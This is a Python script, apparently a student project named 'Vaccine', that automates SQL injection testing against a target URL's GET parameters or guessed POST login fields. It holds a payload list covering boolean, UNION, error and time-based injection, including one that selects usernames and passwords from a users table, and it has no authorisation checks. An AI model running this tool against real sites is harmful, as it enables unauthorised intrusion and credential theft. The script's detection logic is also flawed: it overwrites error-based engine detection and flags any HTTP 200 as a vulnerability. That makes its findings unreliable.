import argparse
import json
import requests
import urllib.parse
import time

DEFAULT_OUTPUT = "vaccine_results.json"

# Payloads par type de test
SQLI_PAYLOADS = {
    "boolean_true": "' OR 1=1 --",
    "boolean_false": "' OR 1=2 --",
    "union_test": "' UNION SELECT NULL,NULL --",
    "error_test": "' AND 1=1/0 --",
    "time_mysql": "' OR IF(1=1, SLEEP(3), 0) --",
    "time_pg": "' OR pg_sleep(3) --",
    "syntax_error": "' OR 'a'='a",
    "test": "' UNION SELECT username, password FROM users; -- ",
}

def parse_args():
    parser = argparse.ArgumentParser(description="SQLi Scanner - Vaccine")
    parser.add_argument("url", help="Target URL with injectable parameters")
    parser.add_argument("-o", "--output", help="Output file", default=DEFAULT_OUTPUT)
    parser.add_argument("-X", "--method", help="HTTP method to use", choices=["GET", "POST"], default="GET")
    return parser.parse_args()

def extract_params(url):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    return list(query.keys())

def inject_get(url, param, payload):
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    qs[param] = payload
    new_query = urllib.parse.urlencode(qs, doseq=True)
    full_url = parsed._replace(query=new_query).geturl()
    start = time.time()
    resp = requests.get(full_url)
    duration = time.time() - start
    return resp, duration

def inject_post(url, field, payload):
    data = {field: payload, "password": "pass"}
    start = time.time()
    resp = requests.post(url, json=data)
    duration = time.time() - start
    return resp, duration

def detect_db_engine(resp_text):
    if "You have an error in your SQL syntax" in resp_text:
        return "MySQL"
    elif "syntax error at or near" in resp_text:
        return "PostgreSQL"
    elif "Unclosed quotation mark after the character string" in resp_text or "Microsoft SQL Server" in resp_text:
        return "MSSQL"
    else:
        return "Unknown"


def run_tests(url, method):
    results = {}
    target = {}

    if method == "GET":
        params = extract_params(url)
        if not params:
            print("[-] No parameters found in URL.")
            return {}
        print(f"[+] Testing GET params: {params}")
        for param in params:
            for name, payload in SQLI_PAYLOADS.items():
                resp, duration = inject_get(url, param, payload)
                result = {
                    "param": param,
                    "payload": payload,
                    "test": name,
                    "status": resp.status_code,
                    "length": len(resp.text),
                    "snippet": resp.text[:500],
                    "possible_vuln": False,
                    "db": detect_db_engine(resp.text),
                }
                db_engine = "Unknown"
                if name == "time_mysql" and duration > 2.5:
                    db_engine = "MySQL"
                elif name == "time_pg" and duration > 2.5:
                    db_engine = "PostgreSQL"
                result["db"] = db_engine
                if db_engine != "Unknown":
                    print(f"[+] Detected DB engine: {db_engine} on param/field {param if method=='GET' else field}")
                if name.startswith("boolean") or name.startswith("union"):
                    result["possible_vuln"] = True if resp.status_code == 200 else False
                if name.startswith("time") and duration > 2.5:
                    result["possible_vuln"] = True
                target.setdefault("vulnerable_params", []).append(result)

    elif method == "POST":
        fields = ["email", "username", "user", "login"]
        print(f"[+] Testing POST fields: {fields}")
        for field in fields:
            for name, payload in SQLI_PAYLOADS.items():
                resp, duration = inject_post(url, field, payload)
                result = {
                    "field": field,
                    "payload": payload,
                    "test": name,
                    "status": resp.status_code,
                    "length": len(resp.text),
                    "snippet": resp.text[:500],
                    "possible_vuln": False,
                    "db": detect_db_engine(resp.text),
                }
                db_engine = "Unknown"
                if name == "time_mysql" and duration > 2.5:
                    db_engine = "MySQL"
                elif name == "time_pg" and duration > 2.5:
                    db_engine = "PostgreSQL"
                result["db"] = db_engine
                if db_engine != "Unknown":
                    print(f"[+] Detected DB engine: {db_engine} on param/field {param if method=='GET' else field}")
                if name.startswith("boolean") or name.startswith("union"):
                    result["possible_vuln"] = resp.status_code == 200
                if name.startswith("time") and duration > 2.5:
                    result["possible_vuln"] = True
                target.setdefault("vulnerable_params", []).append(result)

    results[url] = {
        "method": method,
        **target
    }
    return results

def save_results(results, path):
    with open(path, "w") as f:
        json.dump(results, f, indent=4)
    print(f"[+] Results saved to {path}")

if __name__ == "__main__":
    args = parse_args()
    results = run_tests(args.url, args.method)
    if results:
        save_results(results, args.output)